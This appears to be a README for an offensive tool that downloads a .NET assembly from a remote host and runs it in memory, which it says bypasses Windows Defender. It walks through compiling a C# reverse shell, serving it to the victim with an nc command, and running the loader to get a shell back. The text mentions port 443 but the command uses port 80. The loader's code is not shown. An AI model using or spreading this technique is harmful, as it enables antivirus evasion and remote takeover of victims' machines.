# DotnetFilelessExecution

This code fetches a dotnet assembly from a remote server, and executes it in memory, bypassing windows defender.

## Mechanics

In my kali machine, I compiled a c# reverse shell using mono. It outputs to a file called `winrev.exe`

Now, I have to serve the file using nc, and start a reverse listener on port 443.

```bash
nc -nvlp 80 < winrev.exe
```

Now on the victim side, I just have to run the compiled executable

```powershell
.\DotnetFilelessExecution.exe
```

And voila, we receive a shell connection back.

## Demonstration

A full video walkthrough will be soon uploaded on youtube.
